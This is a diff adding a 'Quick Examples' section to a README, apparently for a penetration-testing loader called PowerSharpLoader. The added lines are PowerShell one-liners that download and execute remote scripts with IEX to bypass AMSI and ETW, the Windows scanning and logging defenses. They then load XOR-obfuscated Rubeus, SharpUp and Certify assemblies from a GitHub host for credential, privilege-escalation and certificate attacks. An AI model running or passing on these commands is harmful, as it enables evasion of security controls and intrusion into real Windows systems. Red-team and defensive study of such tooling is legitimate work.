@@ -221,6 +221,25 @@ PS C:\Users\pentester> Invoke-LoadAssemblyXOR -AssemblyUrl "https://test.1o1.st/
 PS C:\Users\pentester>
 ```
 
+Quick Examples:
+```
+## Bypass AMSI and ETW, Load the loader script
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi1_1.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXOR.ps1"));
+
+## Load the rubeus
+Invoke-LoadAssemblyXOR -AssemblyUrl "https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/x64/rubeusxorb64meow.txt" -KeyString "meow_key_meow" -Command "hash /password:test"
+
+## Load the SharpUp
+Invoke-LoadAssemblyXOR -AssemblyUrl "https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/x64/sharpupxorb64meow.txt" -KeyString "meow_key_meow" -Command "audit"
+
+## Load the Certify
+Invoke-LoadAssemblyXOR -AssemblyUrl "https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/x64/certifyxorb64meow.txt" -KeyString "meow_key_meow" -Command "find /vulnerable"
+
+```
+
 ## [Update] Add a feature to load XOR encrypted and base64 encoded payload from local path. This might be useful in some extreme situation.
 
 ```
